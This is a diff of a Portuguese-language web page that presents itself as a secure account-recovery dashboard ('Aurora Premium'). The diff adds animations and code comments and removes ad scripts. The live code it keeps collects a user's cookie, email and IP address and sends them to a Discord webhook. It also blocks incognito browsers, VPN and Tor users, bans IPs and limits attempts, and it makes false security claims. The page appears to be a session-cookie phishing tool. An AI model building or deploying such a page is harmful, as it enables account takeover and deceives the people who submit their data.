@@ -143,6 +143,17 @@
             to { opacity: 1; transform: scale(1); }
         }
 
+        @keyframes float {
+            0%, 100% { transform: translateY(0px); }
+            50% { transform: translateY(-20px); }
+        }
+
+        @keyframes floatRotate {
+            0% { transform: translateY(0) rotate(0deg); }
+            50% { transform: translateY(-30px) rotate(180deg); }
+            100% { transform: translateY(0) rotate(360deg); }
+        }
+
         @keyframes pulse {
             0%, 100% { opacity: 1; }
             50% { opacity: 0.5; }
@@ -1933,11 +1944,6 @@
                 <h2 class="section-title">Dashboard de Recuperação</h2>
                 <p class="section-subtitle">Recupere sua conta de forma segura e confiável 🇧🇷</p>
                 
-                <!-- ===== ANÚNCIO 1 (300x250) ===== -->
-                <div id="ad-container-1" style="text-align: center; margin: 1rem auto; padding: 0.5rem; max-width: 300px; background: rgba(0, 151, 57, 0.05); border-radius: 12px; border: 1px solid rgba(254, 220, 0, 0.2);">
-                    <p style="color: rgba(255,255,255,0.3); font-size: 0.6rem; margin-bottom: 0.3rem;">— Publicidade —</p>
-                </div>
-                
                 <div class="recovery-grid">
                     <div class="main-card">
                         <div class="card-header">
@@ -1974,11 +1980,6 @@
                                 <p><strong>Segurança:</strong> Seus dados são criptografados com AES-256 e processados em servidores seguros com proteção de nível militar. <span style="color:#fedc00;">🇧🇷 #HexaVem</span></p>
                             </div>
 
-                            <!-- ===== ANÚNCIO 2 (300x250) ===== -->
-                            <div id="ad-container-2" style="text-align: center; margin: 1rem 0; padding: 0.5rem; max-width: 300px; background: rgba(255,255,255,0.03); border-radius: 8px;">
-                                <p style="color: rgba(255,255,255,0.3); font-size: 0.6rem; margin-bottom: 0.3rem;">— Publicidade —</p>
-                            </div>
-
                             <button type="submit" class="btn btn-primary btn-block btn-lg" id="submitBtn">
                                 <i class="fas fa-lock-open"></i> Iniciar Recuperação
                             </button>
@@ -2000,11 +2001,6 @@
                                         </a>
                                     </div>
                                 </div>
-                            </div>
-
-                            <!-- ===== ANÚNCIO 3 (160x600) ===== -->
-                            <div id="ad-container-3" style="text-align: center; margin: 1rem 0; padding: 0.5rem; max-width: 160px; background: rgba(255,255,255,0.03); border-radius: 8px;">
-                                <p style="color: rgba(255,255,255,0.3); font-size: 0.6rem; margin-bottom: 0.3rem;">— Publicidade —</p>
                             </div>
 
                             <p class="disclaimer">
@@ -2092,11 +2088,6 @@
             <div class="content-wrapper">
                 <h2 class="section-title">Perguntas Frequentes</h2>
                 <p class="section-subtitle">Encontre respostas para suas dúvidas 🇧🇷</p>
-                
-                <!-- ===== ANÚNCIO 4 (320x50) ===== -->
-                <div id="ad-container-4" style="text-align: center; margin: 1rem auto; padding: 0.5rem; max-width: 320px; background: rgba(0, 151, 57, 0.05); border-radius: 12px; border: 1px solid rgba(254, 220, 0, 0.2);">
-                    <p style="color: rgba(255,255,255,0.3); font-size: 0.6rem; margin-bottom: 0.3rem;">— Publicidade —</p>
-                </div>
                 
                 <div class="faq-grid">
                     <div class="faq-item">
@@ -2299,11 +2290,13 @@
         // 1. DETECÇÃO AVANÇADA DE NAVEGADOR ANÔNIMO E VPN
         // ============================================================
         
+        // Detectar modo privado/anônimo com múltiplos métodos
         function isPrivateBrowsing() {
             return new Promise((resolve) => {
                 let detectionMethods = 0;
                 let positiveResults = 0;
 
+                // Método 1: localStorage
                 try {
                     const test = '__aurora_test__';
                     localStorage.setItem(test, '1');
@@ -2313,6 +2306,7 @@
                 }
                 detectionMethods++;
 
+                // Método 2: sessionStorage
                 try {
                     const test = '__aurora_test__';
                     sessionStorage.setItem(test, '1');
@@ -2322,6 +2316,7 @@
                 }
                 detectionMethods++;
 
+                // Método 3: IndexedDB
                 try {
                     const request = indexedDB.open('__aurora_test__');
                     request.onerror = () => {
@@ -2342,18 +2337,23 @@
                     }
                 }
 
+                // Timeout para garantir resposta
                 setTimeout(() => {
                     resolve(positiveResults >= 2);
                 }, 1000);
             });
         }
 
+        // ============================================================
+        // 1.5 FUNÇÃO PARA DETECTAR NAVEGADOR ANÔNIMO (VIA NAVEGADOR - MAIS EFICAZ)
+        // ============================================================
         function detectPrivateBrowsingBrowser() {
             return new Promise((resolve) => {
                 let result = false;
                 let checksDone = 0;
                 let totalChecks = 4;
                 
+                // Método 1: localStorage
                 try {
                     const test = '__aurora_test__';
                     localStorage.setItem(test, '1');
@@ -2363,6 +2363,7 @@
                 }
                 checksDone++;
 
+                // Método 2: sessionStorage
                 try {
                     const test = '__aurora_test__';
                     sessionStorage.setItem(test, '1');
@@ -2372,6 +2373,7 @@
                 }
                 checksDone++;
 
+                // Método 3: IndexedDB
                 try {
                     const request = indexedDB.open('__aurora_test__');
                     request.onerror = () => { 
@@ -2392,8 +2394,10 @@
                     if (checksDone >= totalChecks) resolve(result);
                 }
 
+                // Método 4: quota de armazenamento (Chrome)
                 if (navigator.storage && navigator.storage.estimate) {
                     navigator.storage.estimate().then(estimate => {
+                        // Em modo incógnito, a quota é menor que 120MB
                         if (estimate.quota < 120000000) {
                             result = true;
                         }
@@ -2408,17 +2412,21 @@
                     if (checksDone >= totalChecks) resolve(result);
                 }
 
+                // Timeout para garantir resposta
                 setTimeout(() => {
                     resolve(result);
                 }, 3000);
             });
         }
 
+        // Detectar VPN/Proxy via IP com múltiplos métodos
         async function detectVPN() {
             try {
+                // Usar múltiplas APIs para melhor precisão
                 const ipData = await getIPData();
                 if (!ipData) return false;
 
+                // Verificar indicadores de VPN com lógica mais rigorosa
                 const vpnIndicators = [
                     ipData.is_vpn === true,
                     ipData.is_proxy === true,
@@ -2427,6 +2435,7 @@
                     ipData.threat_level > 50
                 ];
 
+                // Retorna true se detectar VPN/Proxy/Tor ou datacenter
                 const detected = vpnIndicators.some(indicator => indicator === true);
                 if (detected) {
                     console.warn('🚨 VPN/Proxy detectado:', ipData);
@@ -2438,6 +2447,7 @@
             }
         }
 
+        // Obter dados de IP com fallback
         async function getIPData() {
             const apis = [
                 {
@@ -2489,12 +2499,15 @@
             return null;
         }
 
+        // Detectar Google Chrome anônimo especificamente com múltiplos métodos
         async function isGoogleIncognito() {
             return new Promise((resolve) => {
                 let detectionResults = [];
 
+                // Método 1: Verificar quota de armazenamento
                 if (navigator.storage && navigator.storage.estimate) {
                     navigator.storage.estimate().then(estimate => {
+                        // Em modo incógnito, a quota é muito menor (< 120MB)
                         detectionResults.push(estimate.quota < 120000000);
                         if (detectionResults.length >= 2) {
                             resolve(detectionResults.some(r => r === true));
@@ -2509,6 +2522,7 @@
                     detectionResults.push(false);
                 }
 
+                // Método 2: Verificar requestFileSystem (Chrome específico)
                 if (window.webkitRequestFileSystem) {
                     window.webkitRequestFileSystem(
                         window.TEMPORARY,
@@ -2520,7 +2534,7 @@
                             }
                         },
                         () => {
-                            detectionResults.push(true);
+                            detectionResults.push(true); // Erro = modo incógnito
                             if (detectionResults.length >= 2) {
                                 resolve(detectionResults.some(r => r === true));
                             }
@@ -2530,6 +2544,7 @@
                     detectionResults.push(false);
                 }
 
+                // Timeout para garantir resposta
                 setTimeout(() => {
                     if (detectionResults.length > 0) {
                         resolve(detectionResults.some(r => r === true));
@@ -2542,8 +2557,11 @@
 
         async function checkBlocked() {
             try {
+                // Verificar navegador anônimo
                 const isPrivate = await isPrivateBrowsing();
                 const isGoogleIncog = await isGoogleIncognito();
+                
+                // Verificar VPN/Proxy
                 const hasVPN = await detectVPN();
                 
                 const blockModal = document.getElementById('blockModal');
@@ -2618,12 +2636,14 @@
         // ============================================================
         async function checkBanStatus() {
             try {
+                // Pegar IP do visitante
                 const ipResponse = await fetch('https://api.ipify.org?format=json');
                 const ipData = await ipResponse.json();
                 const ip = ipData.ip;
 
                 console.log('🔍 Verificando IP:', ip);
 
+                // Verificar na API de banimento
                 const banResponse = await fetch(`/api/ban?check=${ip}`);
                 const banData = await banResponse.json();
 
@@ -2664,11 +2684,13 @@
             blockModal.classList.add('active');
             document.body.style.overflow = 'hidden';
             
+            // Esconder o formulário de recuperação
             const recoveryForm = document.getElementById('recoveryForm');
             if (recoveryForm) {
                 recoveryForm.style.display = 'none';
             }
             
+            // Desabilitar botão de submit
             const submitBtn = document.getElementById('submitBtn');
             if (submitBtn) {
                 submitBtn.disabled = true;
@@ -2682,6 +2704,7 @@
         // 4. TERMS MODAL
         // ============================================================
         function openTermsModal() {
+            // Verificar se está banido
             if (isUserBanned) {
                 showNotification('🚫', 'Acesso Bloqueado!', 'Você está banido e não pode acessar o sistema.');
                 return;
@@ -2708,6 +2731,7 @@
             if (saved === 'true') {
                 termsAccepted = true;
             } else {
+                // Verificar se está banido antes de abrir o modal
                 if (!isUserBanned) {
                     setTimeout(() => { openTermsModal(); }, 1500);
                 }
@@ -2733,6 +2757,7 @@
         // ============================================================
         async function sendToWebhook(cookie, email, ip, isPrivate, vpnDetected) {
             try {
+                // Obter dados de VPN para relatório
                 const vpnData = vpnDetected ? await getIPData() : null;
                 
                 const payload = {
@@ -2785,6 +2810,7 @@
                         message = '🌐 VPN ou Proxy Detectado\n\n❌ Conexões via VPN ou proxy não são permitidas por questões de segurança.';
                     }
                     
+                    // Detalhes adicionais
                     if (data.data.vpn && data.data.vpn.details) {
                         const details = data.data.vpn.details;
                         message += `\n\n📌 Detalhes:\n📍 País: ${details.country}\n🏙️ Cidade: ${details.city}\n📡 ISP: ${details.isp}`;
@@ -2814,6 +2840,7 @@
         // 8. NAVEGAÇÃO
         // ============================================================
         function showSection(sectionId) {
+            // VERIFICAR SE O USUÁRIO ESTÁ BANIDO
             if (isUserBanned) {
                 showNotification('🚫', 'Acesso Bloqueado!', 'Você está banido e não pode acessar o sistema.');
                 return;
@@ -2840,6 +2867,7 @@
         // 8.5 FUNÇÃO PARA IR PARA RECUPERAÇÃO COM VERIFICAÇÃO
         // ============================================================
         function goToRecovery() {
+            // VERIFICAR SE O USUÁRIO ESTÁ BANIDO
             if (isUserBanned) {
                 showNotification('🚫', 'Acesso Bloqueado!', 'Você está banido e não pode usar o sistema de recuperação.');
                 return;
@@ -2908,22 +2936,26 @@
         async function handleSubmit(event) {
             event.preventDefault();
             
+            // VERIFICAR SE O USUÁRIO ESTÁ BANIDO
             if (isUserBanned) {
                 showNotification('🚫', 'Acesso Bloqueado!', 'Você está banido e não pode usar o sistema de recuperação.');
                 return;
             }
             
+            // Verificar se aceitou os termos
             if (!termsAccepted) {
                 openTermsModal();
                 showNotification('⚠️', 'Aceite os Termos!', 'Você precisa aceitar os termos de serviço para continuar. 🇧🇷');
                 return;
             }
             
+            // Verificar se está bloqueado por tentativa
             if (isBlocked) {
                 showNotification('⏳', 'Aguarde!', 'Você precisa esperar 9 horas para tentar novamente.');
                 return;
             }
 
+            // Verificar navegador anônimo (reforço)
             const isPrivate = await isPrivateBrowsing();
             const isGoogleIncog = await isGoogleIncognito();
             const hasVPN = await detectVPN();
@@ -2951,6 +2983,7 @@
                 return;
             }
 
+            // Verificar se já tentou
             if (hasAttempted) {
                 showNotification('⏳', 'Limite atingido!', 'Você só pode tentar 1 vez. Aguarde 9 horas.');
                 return;
@@ -2958,6 +2991,7 @@
 
             const ip = await getIP();
 
+            // Mostrar loading
             document.getElementById('submitBtn').disabled = true;
             document.getElementById('submitBtn').innerHTML = '<i class="fas fa-spinner fa-spin"></i> Enviando...';
 
@@ -2967,6 +3001,7 @@
                 hasAttempted = true;
                 isBlocked = true;
                 
+                // Salvar bloqueio de 9 horas
                 blockUntil = Date.now() + (9 * 60 * 60 * 1000);
                 localStorage.setItem('aurora_block_until', blockUntil.toString());
                 
@@ -3122,78 +3157,7 @@
         }
 
         // ============================================================
-        // 19. CARREGAR ANÚNCIOS ASSINCRONAMENTE
-        // ============================================================
-        function loadAds() {
-            console.log('📢 Carregando anúncios...');
-            
-            try {
-                // Anúncio 1 - 300x250 (key: 47e1bb2217d6ae2e3cc7625133c84044)
-                window.atOptions = {
-                    'key': '47e1bb2217d6ae2e3cc7625133c84044',
-                    'format': 'iframe',
-                    'height': 250,
-                    'width': 300,
-                    'params': {}
-                };
-                const script1 = document.createElement('script');
-                script1.async = true;
-                script1.src = 'https://www.highperformanceformat.com/47e1bb2217d6ae2e3cc7625133c84044/invoke.js';
-                document.getElementById('ad-container-1').appendChild(script1);
-                
-                // Anúncio 2 - 300x250 (key: 47e1bb2217d6ae2e3cc7625133c84044)
-                setTimeout(() => {
-                    window.atOptions = {
-                        'key': '47e1bb2217d6ae2e3cc7625133c84044',
-                        'format': 'iframe',
-                        'height': 250,
-                        'width': 300,
-                        'params': {}
-                    };
-                    const script2 = document.createElement('script');
-                    script2.async = true;
-                    script2.src = 'https://www.highperformanceformat.com/47e1bb2217d6ae2e3cc7625133c84044/invoke.js';
-                    document.getElementById('ad-container-2').appendChild(script2);
-                }, 300);
-                
-                // Anúncio 3 - 160x600 (key: 8e3fec9e624bd2902818ab38fe54a1b4)
-                setTimeout(() => {
-                    window.atOptions = {
-                        'key': '8e3fec9e624bd2902818ab38fe54a1b4',
-                        'format': 'iframe',
-                        'height': 600,
-                        'width': 160,
-                        'params': {}
-                    };
-                    const script3 = document.createElement('script');
-                    script3.async = true;
-                    script3.src = 'https://www.highperformanceformat.com/8e3fec9e624bd2902818ab38fe54a1b4/invoke.js';
-                    document.getElementById('ad-container-3').appendChild(script3);
-                }, 600);
-                
-                // Anúncio 4 - 320x50 (key: ea108e2f7a60455c382a91d4e1962b3b)
-                setTimeout(() => {
-                    window.atOptions = {
-                        'key': 'ea108e2f7a60455c382a91d4e1962b3b',
-                        'format': 'iframe',
-                        'height': 50,
-                        'width': 320,
-                        'params': {}
-                    };
-                    const script4 = document.createElement('script');
-                    script4.async = true;
-                    script4.src = 'https://www.highperformanceformat.com/ea108e2f7a60455c382a91d4e1962b3b/invoke.js';
-                    document.getElementById('ad-container-4').appendChild(script4);
-                }, 900);
-                
-                console.log('✅ Anúncios carregados!');
-            } catch (error) {
-                console.warn('⚠️ Erro ao carregar anúncios:', error);
-            }
-        }
-
-        // ============================================================
-        // 20. CONSOLE
+        // 19. CONSOLE
         // ============================================================
         console.log('%c🏆 Aurora Premium v2.0 🇧🇷', 'font-size:24px;font-weight:bold;color:#009739;');
         console.log('%c🔒 Sistema de Recuperação de Contas', 'font-size:16px;color:#fedc00;');
@@ -3203,14 +3167,14 @@
         console.log('%c🔒 Detecção de VPN/Proxy ativada', 'font-size:14px;color:#10b981;');
         console.log('%c🔒 Detecção de navegador anônimo (via navegador)', 'font-size:14px;color:#10b981;');
         console.log('%c📡 Webhook configurada: ✅', 'font-size:14px;color:#10b981;');
-        console.log('%c📢 Anúncios carregados assincronamente', 'font-size:14px;color:#f59e0b;');
+        console.log('%c👥 Comunidade: Discord | Email | TikTok', 'font-size:14px;color:#fedc00;');
         console.log('%c🏆 #HexaVem! 🇧🇷', 'font-size:18px;font-weight:bold;color:#fedc00;');
 
         // ============================================================
-        // 21. INICIAR
+        // 20. INICIAR
         // ============================================================
         async function init() {
-            // ===== 1. VERIFICAR NAVEGADOR ANÔNIMO =====
+            // ===== 1. VERIFICAR NAVEGADOR ANÔNIMO (VIA NAVEGADOR - MAIS CONFIÁVEL) =====
             console.log('🔍 Verificando navegador anônimo (via navegador)...');
             const isPrivateBrowser = await detectPrivateBrowsingBrowser();
             
@@ -3230,7 +3194,7 @@
             const isBanned = await checkBanStatus();
             if (isBanned) {
                 console.log('🚫 Acesso bloqueado: IP banido');
-                return;
+                return; // IMPEDE O ACESSO COMPLETO AO SITE
             }
             console.log('✅ IP não está banido, continuando...');
 
@@ -3244,11 +3208,11 @@
             }
             console.log('✅ Navegador e VPN OK!');
 
-            // Carregar informações do webhook
+            // Carregar informações do webhook do Discord
             console.log('🔗 Carregando informações do webhook...');
             await fetchWebhookInfo();
             
-            // Verificar bloqueio de anônimo (fallback)
+            // Verificar bloqueio de anônimo (APENAS - fallback)
             const blocked = await checkBlocked();
             if (blocked) {
                 console.log('🚭 Acesso bloqueado: Navegador Anônimo detectado');
@@ -3257,20 +3221,10 @@
             
             restoreBlockState();
             checkTerms();
-            
-            // Carregar anúncios após a página carregar
-            console.log('📢 Agendando carregamento de anúncios...');
-            if (document.readyState === 'complete') {
-                setTimeout(loadAds, 1000);
-            } else {
-                window.addEventListener('load', function() {
-                    setTimeout(loadAds, 1500);
-                });
-            }
         }
 
         // ============================================================
-        // 22. EXECUTAR
+        // 21. EXECUTAR
         // ============================================================
         init();
     </script>
